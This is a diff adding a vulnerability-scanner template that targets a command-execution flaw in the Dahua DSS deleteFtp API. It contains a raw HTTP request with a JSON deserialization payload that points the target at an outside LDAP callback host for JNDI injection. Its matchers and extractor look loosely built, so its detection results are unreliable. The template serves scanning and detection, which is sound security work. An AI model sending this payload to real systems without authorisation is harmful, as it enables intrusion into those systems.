@@ -1,0 +1,30 @@
+id: dahua-dss-command-execution
+info:
+  name: Dahua DSS deleteFtp API Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Dahua DSS deleteFtp API is vulnerable to command execution, allowing attackers to execute arbitrary commands on the server.
+  tags: command-execution, dahua, api
+http:
+  - raw:
+      - |
+        POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "LDAP"
+      - type: word
+        words:
+          - "JdbcRowSetImpl"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "LDAP request processed successfully"
